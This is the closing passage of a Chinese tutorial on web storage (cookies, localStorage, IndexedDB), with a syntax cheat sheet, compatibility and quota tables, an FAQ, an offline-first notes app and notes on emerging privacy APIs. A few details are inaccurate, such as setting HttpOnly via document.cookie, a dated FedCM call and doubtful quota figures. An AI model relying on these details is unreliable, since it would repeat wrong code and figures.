- **Web Storage Specification**：https://www.w3.org/TR/webstorage/ —— W3C 官方规范
- **Indexed Database API 3.0**：https://www.w3.org/TR/IndexedDB-3/ —— IndexedDB 最新规范
- **Storage Standard**：https://storage.spec.whatwg.org/ —— WHATWG 存储标准
- **Service Worker API**：https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API

### 14.2 经典著作

- **《JavaScript: The Definitive Guide》**（David Flanagan, 2020）：第 15 章深入讲解 Web 存储
- **《High Performance Browser Networking》**（Ilya Grigorik, 2013）：第 11 章讲解 Cookie 与性能
- **《Programming JavaScript Applications》**（Eric Elliott, 2014）：函数式存储抽象

### 14.3 在线教程

- **web.dev: Storage for the web**：https://web.dev/articles/storage-for-the-web —— Google 团队权威指南
- **MDN Web Storage API**：https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API
- **Google Developers: Cookie Security**：https://developers.google.com/web/updates/2020/02/cookie-samesite

### 14.4 相关主题

- **Service Worker**：离线优先的核心技术
- **Cache API**：专为 Response 对象设计的缓存
- **WebCrypto API**：加密敏感数据
- **Storage Access API**：跨站存储访问授权
- **Federated Credential Management API**：联邦认证替代第三方 Cookie
- **Topics API**：基于兴趣的广告替代方案

### 14.5 学术论文

- **Barth, A. 2011. HTTP State Management Mechanism**. IETF RFC 6265. —— Cookie 协议的权威定义
- **Jackson, C. and Barth, A. 2008. Beware of Finer-Grained Origins**. W2SP 2008. —— 同源策略的细化研究
- **Liu, Y. et al. 2012. Tracking for Free, Cookies for Sale**. IEEE S&P 2012. —— Cookie 追踪研究

---

## 15. 附录

### 15.1 语法速查表

```javascript
// Cookie
document.cookie = 'name=value; Max-Age=3600; Path=/; Secure; HttpOnly; SameSite=Strict';

// localStorage
localStorage.setItem('key', 'value');
localStorage.getItem('key');
localStorage.removeItem('key');
localStorage.clear();
localStorage.length;
localStorage.key(i);

// sessionStorage（API 与 localStorage 相同）
sessionStorage.setItem('key', 'value');

// Storage 事件
window.addEventListener('storage', (e) => {
  console.log(e.key, e.oldValue, e.newValue, e.url);
});

// 存储配额
navigator.storage.estimate().then(estimate => {
  console.log(estimate.usage, estimate.quota);
});

// 请求持久化
navigator.storage.persist();
```

### 15.2 兼容性表

| 特性 | Chrome | Firefox | Safari | Edge |
| ---- | ------ | ------- | ------ | ---- |
| localStorage | 4+ | 3.5+ | 4+ | 12+ |
| sessionStorage | 5+ | 3.5+ | 5+ | 12+ |
| IndexedDB | 11+ | 4+ | 10+ | 12+ |
| SameSite=Lax 默认 | 80+ | 69+ | 13+ | 80+ |
| navigator.storage.estimate | 61+ | 57+ | 15.2+ | 79+ |
| navigator.storage.persist | 55+ | 57+ | 15.2+ | 79+ |

### 15.3 存储容量参考

| 浏览器 | localStorage | sessionStorage | IndexedDB | Cache API |
| ------ | ------------ | --------------- | --------- | --------- |
| Chrome | 10MB/源 | 10MB/源 | 60%磁盘 | 60%磁盘 |
| Firefox | 5MB/源 | 5MB/源 | 50%磁盘 | 50%磁盘 |
| Safari | 5MB/源 | 5MB/源 | 1GB/源 | 1GB/源 |
| Edge | 10MB/源 | 10MB/源 | 60%磁盘 | 60%磁盘 |

### 15.4 安全配置速查

```javascript
// 会话 Cookie（最高安全）
setCookie('session', token, {
  maxAge: 3600,
  secure: true,
  httpOnly: true,
  sameSite: 'Strict',
  path: '/',
});

// 持久登录 Cookie
setCookie('remember', token, {
  maxAge: 30 * 86400,
  secure: true,
  httpOnly: true,
  sameSite: 'Lax',
  path: '/',
});

// 公开偏好设置（localStorage）
jsonStorage.set('theme', 'dark');
jsonStorage.set('language', 'zh-CN');

// 离线缓存（IndexedDB）
await cacheDB.set('offlineData', data, 24 * 3600 * 1000);
```

### 15.5 存储抽象层架构

```
┌─────────────────────────────────────────┐
│            Application Layer            │
├─────────────────────────────────────────┤
│         UnifiedStorage 抽象层            │
│   (自动选择后端、提供统一 API)           │
├──────┬──────┬──────┬────────────────────┤
│Cookie│ Local│ Sess-│     IndexedDB      │
│      │Storage│ ion │  (结构化、事务型)   │
│      │      │Storage│                   │
└──────┴──────┴──────┴────────────────────┘
```

### 15.6 术语表

| 术语 | 英文 | 定义 |
| ---- | ---- | ---- |
| 同源策略 | Same-Origin Policy | 限制不同源之间资源访问的安全机制 |
| 浏览上下文 | Browsing Context | 浏览器中展示文档的环境 |
| 第三方 Cookie | Third-Party Cookie | 非当前页面域设置的 Cookie |
| HttpOnly | HttpOnly | Cookie 属性，禁止 JS 访问 |
| SameSite | SameSite | Cookie 属性，控制跨站发送 |
| 事务 | Transaction | 原子操作的集合 |
| 对象存储 | Object Store | IndexedDB 中的数据集合 |
| 配额 | Quota | 浏览器为源分配的存储上限 |
| 持久化存储 | Persistent Storage | 不会被浏览器自动清除的存储 |
| 存储事件 | Storage Event | localStorage 变化时触发的事件 |

### 15.7 修订记录

| 日期 | 版本 | 修订内容 | 修订人 |
| ---- | ---- | -------- | ------ |
| 2026-07-20 | 1.0 | 初始金标准版本 | FANDEX Content Engineering Team |

### 15.8 致谢

本篇文档参考了以下资源：

- W3C Web Storage 规范：权威定义
- WHATWG Storage Standard：最新演进
- MDN Web Docs：详尽的 API 文档
- web.dev：Google 团队的最佳实践
- Jake Archibald 的博客：深入分析存储策略

### 15.9 学习路径

| 阶段 | 主题 | 推荐资源 |
| ---- | ---- | -------- |
| 入门 | Cookie 与 localStorage | MDN Web Storage 教程 |
| 进阶 | sessionStorage 与跨标签页 | 本篇文档 |
| 高级 | IndexedDB 与事务 | MDN IndexedDB 教程 |
| 实战 | 离线优先应用 | web.dev PWA 课程 |
| 深入 | Service Worker 与 Cache API | Google Developers PWA |

### 15.10 教学建议

**面向不同学习者的教学策略：**

1. **初学者**：从 localStorage 入手，强调「持久化存储」的直觉
2. **中级开发者**：结合 Cookie 安全属性，讲解 Web 安全
3. **高级开发者**：深入 IndexedDB 事务模型、离线优先架构

**常见教学误区：**

1. 不区分 localStorage 与 sessionStorage，导致误用
2. 忽略 Cookie 安全属性，留下安全漏洞
3. 不讲解存储配额限制，导致生产环境超限崩溃
4. 过度依赖 localStorage 存储敏感数据，引发安全问题

### 15.11 FAQ

**Q1: localStorage 与 IndexedDB 该选哪个？**

A: 简单键值对、容量小（<5MB）选 localStorage；结构化数据、大容量、事务需求选 IndexedDB。性能敏感的简单场景，localStorage 同步 API 更快；大数据量异步场景，IndexedDB 更优。

**Q2: 如何检测用户是否在隐私模式？**

A: 隐私模式下 localStorage 配额通常为 0 或抛出异常。可尝试写入测试数据，捕获异常判断。但需注意，这种检测可能被未来的浏览器更新绕过，且部分用户可能不希望被检测。

**Q3: 第三方 Cookie 被禁用后如何实现跨站追踪？**

A: 推荐替代方案：(1) Storage Access API（用户授权）；(2) Federated Credential Management API（联邦认证）；(3) Topics API（基于兴趣的广告）；(4) First-Party Sets（同主体站点共享存储）。但隐私保护趋势下，跨站追踪将越来越受限。

**Q4: 如何处理 localStorage 容量超限？**

A: 三步策略：(1) 捕获 QuotaExceededError；(2) 清理过期或低优先级数据；(3) 若仍不足，提示用户或降级到 IndexedDB。建议预先用 navigator.storage.estimate() 监控用量。

**Q5: Cookie 的 SameSite=None 在所有浏览器都可用吗？**

A: Chrome 80+ 要求 SameSite=None 必须配合 Secure，否则被拒绝。部分旧浏览器（如 Safari 12）不支持 SameSite=None，会将其视为 SameSite=Strict。需根据目标用户群选择策略。

### 15.12 总结

Web 存储 API 是现代 Web 应用不可或缺的基础设施，从 1994 年的 Cookie 到 2026 年的 IndexedDB 3.0，经历了 30 余年的演进。

**核心要点回顾：**

1. 四种存储机制各有定位：Cookie（会话状态）、localStorage（持久偏好）、sessionStorage（临时数据）、IndexedDB（结构化大数据）
2. Cookie 必须配置 Secure、HttpOnly、SameSite 三大安全属性
3. localStorage 简单易用但有 5-10MB 上限，且同步阻塞
4. IndexedDB 支持事务、索引、异步，适合离线优先应用
5. 同源策略与浏览上下文隔离构成存储安全基础
6. 跨标签页同步通过 storage 事件实现
7. 离线优先架构需组合 Service Worker、Cache API、IndexedDB

**未来发展方向：**

1. 第三方 Cookie 全面淘汰，隐私保护加强
2. IndexedDB 3.0 原生 Promise API 简化开发
3. Storage Access API 平衡隐私与功能
4. Web 平台存储能力持续增强，向原生应用靠拢

---

## 16. 实战项目：构建离线优先笔记应用

### 16.1 项目目标

构建一个支持离线编辑、跨设备同步、冲突解决的笔记应用：

1. Service Worker 拦截网络请求，实现离线访问
2. IndexedDB 存储笔记数据，支持离线编辑
3. localStorage 存储用户偏好与元数据
4. 后台同步机制，网络恢复时自动推送

### 16.2 完整实现

```javascript
/**
 * 离线优先笔记应用
 */
class OfflineNotesApp {
  constructor() {
    this.dbName = 'NotesAppDB';
    this.dbVersion = 1;
    this.db = null;
    this.configStorage = new NamespacedStorage('notesConfig');
  }

  async init() {
    await this.initDB();
    await this.registerServiceWorker();
    this.setupOnlineListener();
  }

  /**
   * 初始化 IndexedDB
   */
  async initDB() {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.dbName, this.dbVersion);

      request.onupgradeneeded = (e) => {
        const db = e.target.result;

        // 笔记存储
        if (!db.objectStoreNames.contains('notes')) {
          const noteStore = db.createObjectStore('notes', { keyPath: 'id' });
          noteStore.createIndex('updatedAt', 'updatedAt', { unique: false });
          noteStore.createIndex('syncStatus', 'syncStatus', { unique: false });
        }

        // 待同步操作队列
        if (!db.objectStoreNames.contains('pendingOps')) {
          db.createObjectStore('pendingOps', {
            keyPath: 'id',
            autoIncrement: true,
          });
        }
      };

      request.onsuccess = (e) => {
        this.db = e.target.result;
        resolve();
      };

      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 注册 Service Worker
   */
  async registerServiceWorker() {
    if ('serviceWorker' in navigator) {
      try {
        const reg = await navigator.serviceWorker.register('/sw.js');
        console.log('Service Worker registered:', reg.scope);
      } catch (e) {
        console.error('SW registration failed:', e);
      }
    }
  }

  /**
   * 监听网络状态
   */
  setupOnlineListener() {
    window.addEventListener('online', () => {
      console.log('Network restored, syncing...');
      this.syncPendingOps();
    });
  }

  /**
   * 创建笔记
   */
  async createNote(title, content) {
    const note = {
      id: `note_${Date.now()}_${Math.random().toString(36).slice(2)}`,
      title,
      content,
      createdAt: Date.now(),
      updatedAt: Date.now(),
      syncStatus: 'pending',
    };

    await this.saveNote(note);
    await this.queueOp({ type: 'create', noteId: note.id, data: note });

    if (navigator.onLine) {
      await this.syncPendingOps();
    }

    return note;
  }

  /**
   * 更新笔记
   */
  async updateNote(id, updates) {
    const note = await this.getNote(id);
    if (!note) throw new Error('Note not found');

    Object.assign(note, updates, {
      updatedAt: Date.now(),
      syncStatus: 'pending',
    });

    await this.saveNote(note);
    await this.queueOp({ type: 'update', noteId: id, data: updates });

    if (navigator.onLine) {
      await this.syncPendingOps();
    }

    return note;
  }

  /**
   * 删除笔记
   */
  async deleteNote(id) {
    await this.queueOp({ type: 'delete', noteId: id });
    return this.deleteNoteFromDB(id);
  }

  /**
   * 保存笔记到 IndexedDB
   */
  async saveNote(note) {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('notes', 'readwrite');
      const store = tx.objectStore('notes');
      const request = store.put(note);
      request.onsuccess = () => resolve(note);
      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 获取笔记
   */
  async getNote(id) {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('notes', 'readonly');
      const store = tx.objectStore('notes');
      const request = store.get(id);
      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 获取所有笔记
   */
  async getAllNotes() {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('notes', 'readonly');
      const store = tx.objectStore('notes');
      const index = store.index('updatedAt');
      const request = index.getAll();
      request.onsuccess = () => resolve(request.result.reverse());
      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 从 IndexedDB 删除笔记
   */
  async deleteNoteFromDB(id) {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('notes', 'readwrite');
      const store = tx.objectStore('notes');
      const request = store.delete(id);
      request.onsuccess = () => resolve();
      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 将操作加入待同步队列
   */
  async queueOp(op) {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('pendingOps', 'readwrite');
      const store = tx.objectStore('pendingOps');
      const request = store.add({
        ...op,
        timestamp: Date.now(),
      });
      request.onsuccess = () => resolve();
      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 同步待处理操作
   */
  async syncPendingOps() {
    const ops = await this.getPendingOps();

    for (const op of ops) {
      try {
        await this.syncOpToServer(op);
        await this.markOpSynced(op.id);
      } catch (e) {
        console.error('Sync failed for op:', op, e);
        break;  // 失败则停止，下次重试
      }
    }
  }

  /**
   * 获取待同步操作
   */
  async getPendingOps() {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('pendingOps', 'readonly');
      const store = tx.objectStore('pendingOps');
      const request = store.getAll();
      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 同步单个操作到服务器
   */
  async syncOpToServer(op) {
    const response = await fetch('/api/notes/sync', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(op),
    });

    if (!response.ok) {
      throw new Error(`Sync failed: ${response.status}`);
    }

    // 处理冲突
    const result = await response.json();
    if (result.conflict) {
      await this.resolveConflict(op, result.serverVersion);
    }

    // 更新笔记同步状态
    if (op.type !== 'delete') {
      const note = await this.getNote(op.noteId);
      if (note) {
        note.syncStatus = 'synced';
        await this.saveNote(note);
      }
    }
  }

  /**
   * 标记操作已同步
   */
  async markOpSynced(opId) {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('pendingOps', 'readwrite');
      const store = tx.objectStore('pendingOps');
      const request = store.delete(opId);
      request.onsuccess = () => resolve();
      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 冲突解决（简单 LWW 策略）
   */
  async resolveConflict(localOp, serverVersion) {
    const localNote = await this.getNote(localOp.noteId);

    if (serverVersion.updatedAt > localNote.updatedAt) {
      // 服务器版本较新，采用服务器版本
      await this.saveNote({
        ...serverVersion,
        syncStatus: 'synced',
      });
      console.warn('Conflict resolved: server version wins');
    } else {
      // 本地版本较新，重新推送
      console.warn('Conflict resolved: local version wins');
    }
  }

  /**
   * 获取存储使用情况
   */
  async getStorageInfo() {
    if (navigator.storage && navigator.storage.estimate) {
      const estimate = await navigator.storage.estimate();
      return {
        usage: (estimate.usage / 1024 / 1024).toFixed(2) + ' MB',
        quota: (estimate.quota / 1024 / 1024).toFixed(2) + ' MB',
        percentage: (estimate.usage / estimate.quota * 100).toFixed(2) + '%',
      };
    }
    return null;
  }
}

// Service Worker 代码（/sw.js）
/*
const CACHE_NAME = 'notes-app-v1';
const STATIC_ASSETS = [
  '/',
  '/index.html',
  '/static/css/main.css',
  '/static/js/main.js',
];

self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open(CACHE_NAME).then(cache => cache.addAll(STATIC_ASSETS))
  );
});

self.addEventListener('fetch', (event) => {
  // 网络优先，失败时回退缓存
  event.respondWith(
    fetch(event.request).catch(() => caches.match(event.request))
  );
});
*/

// 使用示例
async function main() {
  const app = new OfflineNotesApp();
  await app.init();

  // 创建笔记
  const note = await app.createNote('我的第一篇笔记', 'Hello, offline!');

  // 离线状态下也能编辑
  await app.updateNote(note.id, { content: 'Updated content' });

  // 获取所有笔记
  const allNotes = await app.getAllNotes();
  console.log('All notes:', allNotes);

  // 检查存储使用情况
  const storageInfo = await app.getStorageInfo();
  console.log('Storage:', storageInfo);
}

main();
```

### 16.3 项目总结

本项目展示了离线优先应用的完整存储架构：

1. **分层存储**：IndexedDB 存数据、localStorage 存配置、Cache API 存资源
2. **离线优先**：所有操作先写入本地，再异步同步到服务器
3. **操作队列**：pendingOps 存储待同步操作，保证最终一致性
4. **冲突解决**：基于时间戳的 LWW（Last-Write-Wins）策略
5. **网络感知**：online 事件触发自动同步
6. **Service Worker**：拦截网络请求，离线时回退缓存

---

## 17. 与未来 Web 标准的关联

### 17.1 Storage Access API

允许第三方 iframe 请求用户授权访问其第一方存储：

```javascript
// 跨站 iframe 中请求访问存储
if (document.requestStorageAccess) {
  const hasAccess = await document.requestStorageAccess();
  if (hasAccess) {
    // 可访问第一方 Cookie 与 localStorage
  }
}
```

### 17.2 Federated Credential Management API

替代第三方 Cookie 的联邦认证方案：

```javascript
// 联邦登录（如使用 Google 账号登录第三方站点）
const fedcm = await navigator.credentials.get({
  federated: {
    providers: [{
      configURL: 'https://accounts.google.com/fedcm.json',
      clientId: 'client-id',
    }],
  },
});
```

### 17.3 Topics API

基于兴趣的广告替代方案，不依赖跨站追踪：

```javascript
// 获取用户的兴趣主题
const topics = await document.browsingTopics();
// 返回 [{ topic: 1, version: 'v1' }, ...]
```

### 17.4 First-Party Sets

同主体站点共享存储：

```javascript
// 在 well-known/.first-party-set.json 中声明
{
  "owner": "example.com",
  "members": [" subsidiary1.com", "subsidiary2.com"]
}
```

### 17.5 对 Web 存储的影响

未来 Web 存储的演进方向：

1. **隐私优先**：第三方 Cookie 淘汰，存储隔离加强
2. **用户授权**：跨站存储访问需用户明确同意
3. **联邦化**：身份认证与存储解耦
4. **标准化**：Storage API、Cache API、IndexedDB 持续完善
5. **性能优化**：异步 API、批量操作、流式处理

**未来展望：** Web 存储正从「开放但脆弱」迈向「隐私但可控」。开发者需适应新的隐私模型，采用用户授权、联邦认证、本地优先等新模式。掌握当前存储机制的核心原理，将有助于应对未来标准的演进。
